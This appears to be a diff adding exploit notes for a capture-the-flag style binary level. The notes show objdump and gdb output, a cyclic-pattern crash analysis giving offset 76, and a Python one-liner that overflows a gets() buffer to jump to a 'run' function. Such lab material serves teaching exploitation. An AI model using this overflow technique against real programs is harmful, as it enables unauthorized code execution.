@@ -1,0 +1,35 @@
+
+$ objdump -d ./level1 | grep '<.*>:'
+080482f8 <_init>:
+08048330 <gets@plt-0x10>:
+08048340 <gets@plt>:
+08048350 <fwrite@plt>:
+08048360 <system@plt>:
+08048370 <__gmon_start__@plt>:
+08048380 <__libc_start_main@plt>:
+08048390 <_start>:
+080483c0 <__do_global_dtors_aux>:
+08048420 <frame_dummy>:
+08048444 <run>:
+08048480 <main>:
+080484a0 <__libc_csu_init>:
+08048510 <__libc_csu_fini>:
+08048512 <__i686.get_pc_thunk.bx>:
+08048520 <__do_global_ctors_aux>:
+0804854c <_fini>:
+
+(gdb) r
+Starting program: /home/user/level1/level1
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x63413563 in ?? ()
+
+(gdb) print (char[4])0x63413563
+$2 = "c5Ac"
+
+**
+** OFFSET 76
+**
+
+cat <(python -c 'print "A"*76 + "\x08\x04\x84\x44"[::-1]') - | ./level1
